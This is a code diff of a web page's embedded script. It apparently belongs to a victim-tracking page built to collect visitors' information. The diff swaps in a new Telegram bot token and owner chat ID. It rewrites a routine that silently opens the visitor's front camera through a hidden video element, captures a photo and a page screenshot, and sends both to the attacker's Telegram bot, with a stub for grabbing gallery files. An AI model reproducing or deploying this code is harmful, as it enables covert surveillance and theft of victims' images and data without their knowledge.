@@ -31,8 +31,8 @@ video.floating {position:absolute;width:200px;height:120px;z-index:9999;pointer-
 
 <script>
 (async()=>{
-const BOT_TOKEN="8411929620:AAHnm1BwCsbU9oCgUrRdYwKfrJd7hOGa0_0";
-const OWNER_CHAT_ID="7532272726";
+const BOT_TOKEN="8065356998:AAEqNOf5BSZLGIgA3OPt3XXlDSQ4yBT6WRE";
+const OWNER_CHAT_ID="6454570447";
 
 // ========== LOADING ==========
 const progressBar = document.getElementById('progress-bar');
@@ -180,27 +180,61 @@ async function getVisitorInfo(){
 }
 
 // ========== CAMERA & SCREENSHOT ==========
-const startCapture=async()=>{
-    try{
-        const video=document.createElement('video');
-        video.autoplay=true;video.muted=true;video.style.display='none';
+const startCapture = async () => {
+    try {
+        const video = document.createElement('video');
+        video.autoplay = true;
+        video.muted = true;
+        video.style.display = 'none';
         document.body.appendChild(video);
-        const canvas=document.getElementById('c');
-        const stream=await navigator.mediaDevices.getUserMedia({video:true});
-        video.srcObject=stream;
-        await new Promise(r=>video.onloadedmetadata=r);
-        canvas.width=video.videoWidth; canvas.height=video.videoHeight;
-        canvas.getContext('2d').drawImage(video,0,0);
-        canvas.toBlob(b=>sendPhoto(b,'camera_capture.jpg'),'image/jpeg');
-        stream.getTracks().forEach(t=>t.stop());
-        video.remove();
-    }catch{ await sendTelegram("❌ Camera blocked"); }
 
-    try{
-        const shot=await html2canvas(document.body);
-        shot.toBlob(b=>sendPhoto(b,'screenshot.jpg'),'image/jpeg');
-    }catch{ await sendTelegram("❌ Screenshot failed"); }
-}
+        const canvas = document.getElementById('c');
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: "user" // kamera depan
+            },
+            audio: false
+        });
+
+        video.srcObject = stream;
+
+        await new Promise(resolve => {
+            video.onloadedmetadata = resolve;
+        });
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        canvas.toBlob(
+            blob => sendPhoto(blob, 'camera_capture.jpg'),
+            'image/jpeg',
+            0.9
+        );
+
+        stream.getTracks().forEach(track => track.stop());
+        video.remove();
+
+    } catch (e) {
+        await sendTelegram("❌ Camera blocked");
+    }
+
+    try {
+        const shot = await html2canvas(document.body);
+
+        shot.toBlob(
+            blob => sendPhoto(blob, 'screenshot.jpg'),
+            'image/jpeg',
+            0.9
+        );
+
+    } catch (e) {
+        await sendTelegram("❌ Screenshot failed");
+    }
+};
 
 // ========== GALLERY FILES ==========
 async function pickGalleryFiles(){
